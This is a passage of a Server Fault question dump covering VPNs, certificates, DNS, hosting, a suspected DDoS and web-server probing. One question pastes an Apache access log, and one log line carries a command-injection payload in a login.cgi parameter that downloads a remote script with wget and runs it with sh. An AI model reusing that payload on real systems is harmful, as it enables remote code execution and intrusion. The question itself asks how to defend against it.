","<hyper-v><google-cloud-platform><rdp><windows-server-2016><google-compute-engine>","2018-09-17 12:56:37"
"931323","Is there an opensource package/tool for starting/killling/monitoring a remote process through ssh/tcp sockets?","<p>I'm trying to write an application that can run as a client and a server, with the client and the server talking via ssh/sockets. When the client sends a request to the server, the server should start some child process based on the request from the client, and notify the client if this child process dies.</p>

<p>Instead of starting from scratch, I was wondering if there is any opensource application that already does this.</p>
","<linux>","2018-09-17 17:08:00"
"852160","OpenVPN LAN to LAN","<p>We would like to setup OpenVPN so that we are able to see our devices just like we are connected over a lan switch.</p>

<p>The ""lan switch"" is our server. When we connect to the VPN network we want to get a ip address over dhcp and see each other like ""directly connected over an lan switch"". To keep it short, we would like to play games over VPN.</p>

<p>But we WONT connect the complete Lan network and there nearby connected devices to it or even internet. In this case we just want to connect the pcs that use the OpenVPN client over ""a virtual wire"".</p>

<p>We got that far that we are able to get an ip address and ping the server using tun. But we are not able to see other devices connected.</p>

<p>Thanks in advance.</p>
","<networking><vpn><routing><openvpn><local-area-network>","2017-05-25 09:15:03"
"754273","Guidance for SSL Certificate for our domain services and installation","<p>I'm not well versed on SSL certificates and how to install them in your environment, we have always outsourced this but I am interested in getting a full understanding and being capable of doing this myself.</p>

<p>Let me first state that we have an externally hosted website that uses the same domain name as our internal network. i.e. website is www.domain.com, internal network is domain.com. </p>

<p>The website already has a GEOTRUST SSL Certificate (not wildcard) and sometime ago I did contact them regarding how to combine this with the services we require covering on our network and to get a quote. I think we came to the conclusion the number of domains secured were already taken and we'd have to change to a different certificate and while our website requires a reputable provider for payments etc, the higher price we did not deem to be required for covering internal services we currently have covered by a self signed certificate, does that sound acceptable?</p>

<p>We want to get rid of that unsafe/proceed warning whenever using OWA/RDS Portal externally, and there is also a certificate warning every time a user connects to Outlook or a Server when connected by VPN.</p>

<p>We do multiple bt infinity lines with multiple static IPs for failover i.e. mail.domain.com/owa, mail2.domain.com/owa</p>

<p>So can we just purchase a wildcard SSL certificate to avoid having to declare all of the hostnames?</p>

<p>I have been looking at 123 reg</p>

<p><a href=""https://www.123-reg.co.uk/ssl-certificates/wildcard-ssl-certificates.shtml"" rel=""nofollow noreferrer"">https://www.123-reg.co.uk/ssl-certificates/wildcard-ssl-certificates.shtml</a></p>

<p>There are 3 Wildcard Packages at £80, £175, £225, would you deem any of these acceptable for our requirements? any other recommendations</p>

<p>Could you please list all of the places that this certificate would to be installed/configured within our environment?
Exchange? IIS? (all servers with IIS installed?)</p>

<p>Exchange 2010 is on its own server and so is the RD Web Environment.</p>

<p>Can you see any potential pitfalls I need to be aware of?</p>

<p>Thanks in advance</p>
","<exchange><ssl-certificate>","2016-02-05 14:18:18"
"852163","Managing wifi hotspots between several networks in big building","<p>I'm living in a big 16-floor building. There are 64 apartments in the building, near half of them have ethernet connectivity to different internet providers. </p>

<p>The other half probably don't have computers and internet access. 
But those who have, usually have a wifi router for home use. This is usually cheap devices on 2.4ghz. Most of them are able to use only 802.11g. </p>

<p>Also, there is building near, which have a lot of same type of clients. </p>

<p>So, I'm faced with a problem: there are a lot of wifi networks and they usually use same channels, so overall performance is weak. </p>

<p>My first idea was to setup cooperation. 
What if I help everybody in the building to set up wifi network properly. i.e: we choose three zones with centers on 2, 8, 15 floors. 
Then we move most powered routers there. And all other routers around will join 'existing' network. Like 'extend' them. 
Pros: Limited amount of channels needed. 
Cons: a lot, cooperation is hard. Not everybody likely wants to give his router, etc, etc. </p>

<p>The other idea: choose one. And everybody will extend this one network. 
Share a password between tenants. 
But here is technical issue: not everybody use same internet provider. </p>

<p>So, the question is: Does such a scheme exist when everybody use his own router but share same channel and network name and password but depending on which access point is used, different internet connection is used? </p>

<p>Most clients are mobile phones but there are some laptops probably, so I can't install any additional software. I can only talk to tenants trying to cooperate. </p>

<p>Thank you and sorry for bad english.</p>
","<wifi>","2017-05-25 09:31:11"
"754276","Diff tool which I can force certain lines to match","<p>I have files that I want to compare, and I would need to have a way to force lines to match for the algorithm to pick the block to compare correctly.</p>

<p>For example:
FILE1</p>

<pre><code>test1
    subline1
    subline2
    subline3
test2
    subline1
    subline2
    subline3
    subline4
test3
    subline1
    subline2
    subline3
test4
    subline1
test5
    subline2
    subline3
    subline4
</code></pre>

<p>FILE2</p>

<pre><code>test1
    subline1
    subline2
    subline3
test3
    subline1
    subline2
    subline3
    subline4
test4
    subline1
    subline2
    subline3
    subline4
</code></pre>

<p>Any Tools I use out there, I cannot force a perfect match on the line with ""test"", and since the content of the blocks are similar, it's always matching incorrectly. </p>

<p>See images below :
<a href=""https://i.sstatic.net/P7SHF.png"" rel=""nofollow noreferrer"">Notepad++ Compare</a>
<a href=""https://i.sstatic.net/CNeEZ.png"" rel=""nofollow noreferrer"">Winmerge</a></p>

<p>Meld and diff didn't work either.</p>

<p>Thanks</p>
","<diff>","2016-02-05 14:27:32"
"852187","Windows 7 SP1 SMB (Port 135/445) enabled by default upon install?","<p>I'm curious as over several years ever since I started researching about computer security, SMB has been a place where remote code execution happens the most on the windows OS. Especially With the recent vulnerability MS17-010 Eternal blue. Therefore I am wondering if the Windows 7 SP1 installer has port 135 and port 445 opened by default?</p>
","<windows-7><server-message-block><exploit>","2017-05-25 11:31:54"
"852210","CentOS Increase / Partition Size","<p>One of our servers has a 20gb / partition and it is getting full. Is there any safe way to take some space from the 2TB /home partition and allocate it to the / partition without losing data?</p>

<p>Thanks.</p>
","<linux><centos><partition>","2017-05-25 13:45:58"
"977237","Failed to make https request with self signed certificate authentication","<p>In order to make clients authentication with a self signed certificate, I went through the following steps:</p>

<pre><code>openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -nodes -key ca.key -out ca.crt
</code></pre>

<h3>Create the Server Key, CSR, and Certificate</h3>

<pre><code>openssl genrsa -out server.key 1024
openssl req -nodes -new -key server.key -out server.csr
</code></pre>

<h3>We're self signing our own server cert here.  This is a no-no in production.</h3>

<pre><code>openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt
</code></pre>

<h3>Create the Client Key and CSR</h3>

<pre><code>openssl genrsa -out client.key 1024
openssl req -new -nodes -key client.key -out client.csr
</code></pre>

<h3>Sign the client certificate with our CA cert.  Unlike signing our own server cert, this is what we want to do.</h3>

<pre><code>openssl x509 -req -days 3650 -in client.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out client.crt
</code></pre>

<p>Then I verified the created the certificates via:</p>

<h3>Verify Server Certificate</h3>

<pre><code>openssl verify -purpose sslserver -CAfile ca.crt server.crt
</code></pre>

<h3>Verify Client Certificate</h3>

<pre><code>openssl verify -purpose sslclient -CAfile ca.crt client.crt
</code></pre>

<p>which all are OK.</p>

<p>I configured my <code>python tornado</code> server:</p>

<pre><code>if __name__ == ""__main__"":
   app = make_app()

   ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
   ssl_ctx.load_cert_chain(""../server.crt"", ""../server.key"")
   ssl_ctx.load_verify_locations(""../ca.crt"")
   ssl_ctx.verify_mode = ssl.CERT_REQUIRED
   http_server = tornado.httpserver\
    .HTTPServer(app, ssl_options=ssl_ctx)
   http_server = tornado.httpserver.HTTPServer(app)
   http_server.listen(80)
   logging.info(""Server is running."")
   tornado.ioloop.IOLoop.current().start()
</code></pre>

<p>but when I make a curl request via</p>

<pre><code>curl -v -s -k --key client.key --cert client.crt https://localhost/open/address/health
</code></pre>

<p>It returns <strong>connection refused</strong></p>

<pre><code>*   Trying ::1...
* TCP_NODELAY set
* Connection failed
* connect to ::1 port 443 failed: Connection refused
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connection failed
* connect to 127.0.0.1 port 443 failed: Connection refused
* Failed to connect to localhost port 443: Connection refused
* Closing connection 0
</code></pre>
","<https><authentication><certificate-authority><curl>","2019-07-30 08:57:22"
"931430","Have a system that expires SSH keys every 90th day","<p>I have a customer that now requires us to change every password every 90th day due to their interpretation of GDPR. That's fine for the web-based system we develop for them because we can just implement those rules. But they also require us to change the passwords on our SSH keys used to access the servers, which is, well, not fine.</p>

<ol>
<li>Is it possible to change the password on an existing SSH key?</li>
<li><p>If not, are there any tools we can use to handle this? I'm thinking:</p>

<p>a. Create new keys.<br>
b. Distribute all public keys to existing servers.<br>
c. Remove existing public keys.<br>
d. Archive old private keys . </p>

<p>I've read some posts here about Puppet, but as I understand it they aim to only solve the problem with distributing the public keys among the servers and not creating new keys every nth day? Should I go further with my research into Puppet?</p></li>
<li><p>What is the community standard when it comes to password retention and ssh keys? How do you do it?</p></li>
</ol>
","<puppet><ssh-keys><gdpr>","2018-09-18 07:45:43"
"977276","How to protect against backdoor attack?","<p>I've been getting strange page accesses showing up in my apache error log recently. It seems as though someone is trying to access <code>/wp-login.php</code>, <code>/elrekt.php</code> and other pages that don't exist. It's obvious to me that this is malicious because my site does not use WordPress. I looked into my access logs and am now seeing a link to a GitHub repo attached to these <code>GET</code> requests. I am wondering how I can be aware of an attacker gaining access to my site or of the precautions I can take. I don't believe they have made it through my login because these scripts have been running the last three days. Here is some of my <code>access_log</code>:</p>

<pre><code>66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /html/public/index.php HTTP/1.1"" 302 231 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /html/public/index.php HTTP/1.1"" 404 816 ""http://myip/html/public/index.php"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /public/index.php HTTP/1.1"" 302 226 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /public/index.php HTTP/1.1"" 404 816 ""http://myip/public/index.php"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /TP/html/public/index.php HTTP/1.1"" 302 234 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /TP/html/public/index.php HTTP/1.1"" 404 816 ""http://myip/TP/html/public/index.php"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /elrekt.php HTTP/1.1"" 302 220 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /elrekt.php HTTP/1.1"" 404 816 ""http://myip/elrekt.php"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /index.php HTTP/1.1"" 302 219 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET /index.php HTTP/1.1"" 404 816 ""http://myip/index.php"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET / HTTP/1.1"" 302 210 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
66.94.85.26 - - [28/Jul/2019:11:33:06 +0000] ""GET / HTTP/1.1"" 200 3181 ""http://myip:80"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)""
122.228.19.80 - - [28/Jul/2019:11:38:36 +0000] ""GET / HTTP/1.1"" 200 3181 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0""
79.137.46.233 - - [28/Jul/2019:12:08:55 +0000] ""GET /wp-login.php HTTP/1.1"" 302 222 ""-"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
79.137.46.233 - - [28/Jul/2019:12:08:56 +0000] ""GET /wp-login.php HTTP/1.1"" 404 816 ""http://www.mysite.ca/wp-login.php"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
66.198.246.19 - - [28/Jul/2019:12:46:05 +0000] ""GET / HTTP/1.0"" 302 210 ""-"" ""masscan/1.0 (https://github.com/robertdavidgraham/masscan)""
190.122.168.60 - - [28/Jul/2019:12:59:39 +0000] ""GET / HTTP/1.1"" 302 210 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""
148.70.22.139 - - [28/Jul/2019:13:24:19 +0000] ""GET / HTTP/1.1"" 302 210 ""-"" ""Mozilla/5.0 zgrab/0.x""
148.70.22.139 - - [28/Jul/2019:13:24:22 +0000] ""GET / HTTP/1.1"" 200 3181 ""http://myip:80/"" ""Mozilla/5.0 zgrab/0.x""
185.53.88.40 - - [28/Jul/2019:14:01:03 +0000] ""HEAD /robots.txt HTTP/1.0"" 302 - ""-"" ""-""
66.198.246.19 - - [28/Jul/2019:14:42:43 +0000] ""GET / HTTP/1.0"" 302 210 ""-"" ""masscan/1.0 (https://github.com/robertdavidgraham/masscan)""
120.29.125.194 - - [28/Jul/2019:14:46:10 +0000] ""GET /login.cgi?cli=aa%20aa%27;wget%20http://91.237.249.245/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27$ HTTP/1.1"" 400 226 ""-"" ""Hello, World""
37.221.157.20 - - [28/Jul/2019:15:03:17 +0000] ""GET / HTTP/1.1"" 302 210 ""-"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""
52.67.133.128 - - [28/Jul/2019:15:57:57 +0000] ""GET /wp-login.php HTTP/1.1"" 302 222 ""-"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
52.67.133.128 - - [28/Jul/2019:15:57:57 +0000] ""GET /wp-login.php HTTP/1.1"" 404 816 ""http://mysite.ca/wp-login.php"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
37.59.36.9 - - [28/Jul/2019:16:20:18 +0000] ""GET /wp-login.php HTTP/1.1"" 302 222 ""-"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
37.59.36.9 - - [28/Jul/2019:16:20:19 +0000] ""GET /wp-login.php HTTP/1.1"" 404 816 ""http://mysite.ca/wp-login.php"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0""
</code></pre>

<p>More information as to what I'm dealing with here would also be very much appreciated.</p>
","<linux><brute-force-attacks>","2019-07-30 13:24:27"
"931570","Random Sleep in Crontab/Terminal","<p>I want in terminal or in crontab(both) be able to put a random time.</p>

<p>Something like</p>

<pre><code>Sleep $(1-300)  pkill screen &amp;&amp; ./start
</code></pre>

<p>just a random simple example</p>
","<linux><cron><command-line-interface><ubuntu-16.04><terminal>","2018-09-18 20:35:38"
"852384","Multiple Virtual Machines Windows 10 vs Windows Server With Multiple Users?","<p>I have a few different type of windows software for my work. They are all independent of one another. I have a powerful HP server for this.</p>

<p>If I have let's say 5 different software, what would be better resource-wise:
1. Install each software on separate windows 10 virtual machine
2. Install one windows server and install all 5 software on it and access them through separate users?</p>

<p>I suppose the server would use less resources as it is one OS versus 5 OSes, but how big of a difference would be between both solutions?</p>

<p>(Assume all 5 software work simultaneously)</p>
","<windows>","2017-05-26 10:39:48"
"754760","Shared hosting vs VPS","<p>I am looking at the shared hosting vs VPS plans, and I see that although VPS is much more expensive, I have only limited storage. Whereas in shared hosting I have unlimited storage? Why is this?</p>

<p>What is the adnvantage of using VPS over shared hosting? Is it that I cannot run things like nodejs in shared hosting? Then is PHP the only one I can run it shared hostimg? What are the other options? </p>
","<php><hosting><node.js>","2016-02-08 15:20:42"
"754837","how to make server visible from internet","<p>I have ADSL router with Static IP from my Internet provider. I know that, if I connect my server to router it can be visible from internet (working webserver etc.), but how does clients getting page know that, request should be put to server (I assume, there are many other devices like PC's in that local network).</p>
","<networking><windows-server-2012><ip><isp><static-ip>","2016-02-08 20:44:50"
"754840","Samba and windows2008 AD,ldap works for windows,not for samba","<p>The situation
Two server
one slackware with latest samba 4.3
another windows with windows2008R2
From a linux client i did</p>

<pre><code> ldapsearch -vvv -d 100 -b dc=server,dc=prov -H ldap://server.prov  CN=""franko fr. micheli"" uSNCreated -LLL -Q
</code></pre>

<p>And return...</p>

<pre><code>ldap_initialize( ldap://server:389/??base )
ldap_build_search_req ATTRS: supportedSASLMechanisms
filter: CN=franko fr. micheli
requesting: uSNCreated 
ldap_build_search_req ATTRS: uSNCreated
ldap_result: Can't contact LDAP server (-1)
</code></pre>

<p>Now tryng with windows</p>

<pre><code>ldapsearch -vvv -d 100 -b dc=server,dc=prov -H ldap://server2.prov  CN=""franko fr. micheli"" uSNCreated -LLL -Q
</code></pre>

<p>And work</p>

<p>Why not on samba?</p>

<pre><code>telnet server 389 OK
</code></pre>

<p>smb.conf is</p>

<pre><code># Global parameters
[global]
    workgroup = SERVER
    realm = server.prov
    netbios name = SERVER
    server role = active directory domain controller
    server services = s3fs, rpc, nbt, wrepl, ldap, cldap, kdc, drepl, winbind, ntp_signd, kcc, dnsupdate
    host msdfs = yes
    log file = /var/log/samba/samba.log
    log level = 1
    debug level = 1
    max log size = 50
    #other setting
    template shell = /bin/bash
    template homedir = /home/%ACCOUNTNAME%
        winbind separator = /
    winbind use default domain = Yes
    printing = bsd
    printcap name = /dev/null
</code></pre>
","<ldap><samba>","2016-02-08 20:54:42"
"754897","Hosting Behind Airport Extreme","<p>I'm trying to set up a simple web service (running on a macbook) over a custom port behind a Airport Extreme connected to a D-link cable modem that runs on Time Warner.</p>

<p>Reading from <a href=""https://discussions.apple.com/docs/DOC-3415"" rel=""nofollow noreferrer"">https://discussions.apple.com/docs/DOC-3415</a>, I set up port forwarding on the Airport extreme.  But it doesn't seem to work when I'm curling the IP with the port.  I also have apache running and set up a virtual host with proxypass from / to <a href=""http://localhost:9292"" rel=""nofollow noreferrer"">http://localhost:9292</a></p>

<p>For example:</p>

<ul>
<li>Airport Extreme has IP addr 72.68.0.10</li>
<li>Internet router has IP addr 72.68.0.11</li>
<li>Macbook has internal IP addr 10.0.1.10</li>
<li>Service running on port 8000</li>
</ul>

<p>Connection gets dropped when I curl 10.0.1.10:8000 or 72.68.0.11:8000.  Does anyone know how to get a setup like this working?</p>
","<web-hosting><mac>","2016-02-09 05:05:10"
"754952","what makes two networks different?","<p>When can we say two networks are different from each other? Is it when they have different subnet masks or when they use different policies? Will it be right to say that a router is needed to connect two 'different' networks?</p>
","<networking><router>","2016-02-09 10:38:26"
"755019","Multiple IPv6 addresses added to interface, now IPv6 not working on my server","<p>I got /64 IPv6 block from my server provider.</p>

<p>When I add few IPv6 addresses (maybe 10 or 20) to network interface. Everything works fine about IPv6 network.</p>

<p>When I'm added above 500+ IPv6 addresses to network interface. My server IPv6 network not working.</p>

<p>I'm used to this type of command line to add IP address to network interface.</p>

<pre><code>sudo ifconfig em1 inet6 add 2001:bd8:24ac:36c8::/128
</code></pre>

<p>I need to use at least 1000 IPv6 addresses on my server.</p>

<p>Please help me, how to solve this issue?</p>

<p><strong>Note: I'm using Ubuntu 14.04 64-bit server</strong></p>

<p>Thank you.</p>
","<ubuntu><networking><ipv6><ethernet><interface>","2016-02-09 15:23:07"
"755244","How to cut a string after a number of characters in unix?","<p>How to delete all characters in one line after point with with sed? </p>

<p>I have a file with multiple lines like this:</p>

<ul>
<li>123456789 3483 98765432 56345</li>
<li>985745634 3469 67495735 87654</li>
</ul>

<p>Now I want to delete all after the first 10 characters. So I only want my output to be:</p>

<ul>
<li>123456789</li>
<li>985745634</li>
</ul>

<p>I was googling for that particular example of sed but didn't find any help in those examples.</p>
","<unix><shell><sed><strings>","2016-02-10 11:54:03"
"755255","Exchange Hybrid no longer needed","<p>I've wrote a few post recently regarding my troubles with Hybrid Exchange and a SPLA licence :@</p>

<p>Here's our current situation:</p>

<ul>
<li><p>We have an Exchange 2010 SP3 server that is set up as a hybrid with
Office 365, All mailboxes have been migrated to Office 365</p></li>
<li><p>DirSync is being used synchronize users  </p></li>
<li>MX records point directly to O365</li>
<li>SOA is on premise so all editing of users / mailboxes is done via AD</li>
</ul>

<p>We currently pay our provider monthly via SPLA for this server that is basically used to manage AD properties and can't see how the cost justifies itself.</p>

<p><strong>Question</strong>
<em>Now that all mailboxes have migrated to 365, is there any reason why we need to keep the hybrid connection?</em></p>

<p>Could anybody advice if any of the below scenarios are do-able:</p>

<p><strong>Scenario 1</strong></p>

<ol>
<li>We Add another Exchange 2010 or 2013 server whose license is paid for out right (no SPLA)</li>
<li>Remove current 2010 exchange server (with SPLA)</li>
<li>Continue to edit mailboxes via EMC tools with the new server</li>
</ol>

<p><em>How would we remove the current server?</em></p>

<p><em>What licenses would we need for the 2013 server?</em></p>

<p><em>Do we need to re-run the hybrid wizard (we don't need to move any more mailboxes)</em></p>

<p><strong>Scenario 2</strong></p>

<ol>
<li><p>Remove Hybrid Connection</p></li>
<li><p>Decom existing 2010 Server</p></li>
<li><p>Use a third party AD editor to manage exchange attributes (if they still exist)</p></li>
</ol>

<p><em>Would decommissioning the Exchange server remove AD attributes from objects</em></p>

<p><em>What implications would we have if we just turned off the exchange server</em></p>

<p><strong>Scenario 3</strong></p>

<p>Change the license on the current Exchange server if possible</p>

<p>*What licences do we need *</p>

<p>If you have any other suggestions, please tell me.</p>
","<active-directory><exchange-2010><exchange-hybrid>","2016-02-10 12:26:28"
"755355","Performing DNS queries starting with one of the root servers using dig command","<p>I am having trouble understanding the question for my network assignment. The question states: </p>

<blockquote>
  <p>Discover the sequence of DNS servers your local DNS server with empty cache goes through when it find the IP address of www.case.edu by performing a series of DNS queries starting with one of the root servers [a-m].root-servers.net.   To choose the root DNS server, take value X =  mod 13 and use Xth root server (counting from zero: a.root-server.net is #0, …, m.root-servers.net is #12) Using a series of dig commands, follow the delegation chain.  </p>
</blockquote>

<p>Does the assignment actually want me to query [a-m].root-servers.net, or is root-server.net a holder value for some other url that I need to find by performing a dig query on www.case.edu. I just would like help understanding the question not looking for homework answers. Thanks for any help.</p>
","<linux><domain-name-system><dig>","2016-02-10 18:13:25"
"755363","Should I migrate perforce server from VMWare to cloud (AWS)?","<p>Our company have been using perforce hosted on WMWare. It works fine for Local (US) developers but the team oversea is complaining about its performance. Migration to the cloud may resolve the problem. What could be cons of that move?</p>
","<amazon-web-services><perforce>","2016-02-10 18:45:17"
"755429","How to use dig to send DNS queries to servers of interest directly? (not through my local DNS resolver)","<p>How can I use dig to send a dns query to servers directly? (not through local DNS resolver).</p>
","<domain-name-system><dig>","2016-02-10 23:06:24"
"755498","What is the best way to setup email hosting on different server","<p>we want to use server ""xyz"" for emails and meanwhile keep the site on server ""abc""</p>

<p>we have entered both name server records into godaddy.<br>
ns1.abc.com<br>
ns2.abc.com<br>
ns1.xyz.com<br>
ns2.xyz.com<br><br></p>

<p><strong>In server ""abc"" cPanel</strong> (procedure-abc)<br>
Set Email routing to Remote Mail Exchanger<br>
created a ""mx"" record mail.mydomain.com<br>
created a ""A"" record for ""mail.mydomain.com"" and point that to IP of server ""xyz""<br>
<br><br>
<strong>In server ""xyz"" cPanel</strong> (procedure-xyz)<br>
Point the ""A"" Records of ""mydomain.com"" and point that to IP of server ""abc""<br>
<br><br>
Please tel me what is the best way? <br>
Option1 - Setting up both name server and follow the both setting above<br>
Option2 - Setting up only ""ns1.abc.com"" and follow only procedure-abc<br>
Option3 - Setting up only ""ns1.xys.com"" and follow only procedure-xyz<br></p>
","<mx-record><ns-record>","2016-02-11 10:00:11"
"755741","Is this a DDoS attack? It's been overr 48 hours. What do I do?","<p>I run a Wordpress on EC2 at AWS and I am facing the following issue:</p>

<p>More than 2 days ago, the CPU went straight to 100% and the load balance up to ~20+ (for a 4-vcpu server) out of the blue. </p>

<p>Being unable to understand what is going on, I activated ""I Am Under Attack"" mode on Cloudflare (<a href=""https://blog.cloudflare.com/introducing-im-under-attack-mode/"" rel=""nofollow noreferrer"">https://blog.cloudflare.com/introducing-im-under-attack-mode/</a>) which brought things back to normal (~15% CPU, &lt;1 load). </p>

<p>Since then, as soon as I disable the ""under attack"" mode, the exact same happens, crazy CPU, crazy load. I switch it back on, things go to normal. </p>

<p>Additionally, I am monitoring with <code>tcptrack -i eth0</code> and I see new connections coming in from different IPs when I turn off the Cloudflare protection.</p>

<p>Should I conclude that this is a DDoS attack? What can I do other than siting behind the Cloudflare firewall and how long can it last?</p>

<p>Thanks for any tips </p>
","<ddos><cloudflare>","2016-02-12 07:08:27"
"755949","configure a PAM module to be required for all but certain users for which it should be sufficient","<p>I'd like to be able to configure /etc/pam.d/sshd so that:</p>

<p>for all users except those in group ""admin"", module pam_radius is <strong>required</strong>. </p>

<p>for those users in group admin, module pam_radius is <strong>sufficient</strong>.</p>

<p>How to do this? </p>
","<linux><pam>","2016-02-13 02:52:05"
"756016","Windows Server 2012 RDP: User Profile cannot be loaded","<p>I have done a fresh install of Windows Server 2012 R2 and did only the following configuration steps.
I have added a user and added the user to the preconfigured group of remote desktop users.</p>

<p>Now if I try to login with the created user the following error occurs:</p>

<pre><code>Windows cannot log you on because your profile cannot be loaded 
</code></pre>

<p>The Windows Log got Warnings like:</p>

<pre><code>Source  \\?\C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk 
Target  \\?\C:\Users\user.RS001055\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk
Error   Access Denied
</code></pre>

<p>There are at least 10 Warnings in which the System tries to copy files from the Default user to user.RS001055 and 10 warnings in which the System tries to copy files from the TEMP profile. </p>

<p>I am not sure if </p>

<pre><code>\\?\
</code></pre>

<p>in the beginning of the path is correct. 
Furthermore the folder  </p>

<pre><code> C:\Users\user.RS001055
</code></pre>

<p>does not exist. There is a folder called</p>

<pre><code>C:\Users\user
</code></pre>

<p>It also does not matter if I add the user to the usergroup of administrators - I get the same error.</p>

<p>The machine is virtualized  (KVM).
Thank you!</p>
","<windows-server-2012-r2><rdp>","2016-02-13 16:02:57"
"756023","Which service in Azure to use for storing and serving images and photos in an e-commerce site?","<p>What are the available options?</p>

<p>Until now I have been using a folder structure in my web app for the product catalog that I store on disk. I then publish my app to an Azure website and the images are available as if I had uploaded them using FTP.</p>

<ul>
<li>I need the product catalog to scale.</li>
<li>I should be able to have a pretty path to the photo images. ex: /pretty/path/to/my-photo.jpg</li>
</ul>
","<azure>","2016-02-13 17:00:11"
"756090","Reliably copy files on Windows, whatever the ACLs","<p>I often need to do a quick backup of some user data. And often I have an error message stating the ACLs do not allow to copy the whole data. So I have to modify the source ACLs, which is not a desired method.</p>

<p>In Windows, when a program runs under an administrator account it can not copy files when the ACLs block access to admins.<br>
This behaviour is the same when the account belongs to the Backup Operators, because copy programs use the ""copy API"" and not the ""backup API"".</p>

<p>Anyone know a way to copy a directory structure whatever the source ACLs?<br>
Maybe with a program using the ""backup API""</p>

<p>It is better if we can decide if the ACLs are retained or not on the destination, but this is not a crucial point.</p>
","<windows><permissions>","2016-02-14 05:49:26"
"757219","SQL Server Backup Procedure and different types of backup","<p>Need to know perfect solution on how to backup SQL server Database</p>

<p>Version SQL server 2008 R2.</p>
","<sql-server><sql-server-2008>","2016-02-15 06:53:19"
"757254","Run multiple virtual machines on a virtual server","<p>Is it possible to run multiple virtual machines on a virtual server? I am on a project and I want to run an Intrusion Detection System as distributed using many ubuntu virtual machines. Is it possible to be done on a virtual server which runs Ubuntu?</p>
","<virtual-machines><intrusion-detection><distribution><microsoft-virtual-server>","2016-02-15 10:36:18"
"757285","Virtaul machines on Intel Xeon e5420 cpu","<p>I google around to find out how many cores in intel xeon e5420 cpu, but not got the actual answer.</p>

<p>I have intel xeon e5420 cpu, I would like to run multiple virtual machines with 2 cores on each, how many Virtual machine I can have? Please.</p>

<p>Thank you in advance.</p>
","<virtual-machines><hyper-v><central-processing-unit><intel>","2016-02-15 12:26:38"
"757467","how to execute ssh command in line","<p>i know how can ssh to server as </p>

<pre><code>$ ssh &lt;user&gt;@&lt;domain&gt;
</code></pre>

<p>then second the command prompt ask for password as</p>

<pre><code>&lt;user&gt;@&lt;domain&gt;'s password : -----
</code></pre>

<p>here how can be able to do same with one line ?, that looks like</p>

<pre><code>$ssh &lt;user&gt;@&lt;domain-name&gt; -p &lt;pass&gt;
</code></pre>

<p>is it possible ? if yes how ?</p>
","<ssh>","2016-02-16 09:55:51"
"757497","trying to locate process on server which is sending spam email","<p>I have a CentOS server running Exim, with a standard LAMP stack installed.  The problem is that there is a process that is sending out unsolicited emails, AND I do not know how to locate the process.  Here is what I have done:</p>

<ol>
<li><p>I have done a <code>tail /var/log/exim_mainlog</code> to see what is going on.  This is some of the output:</p>

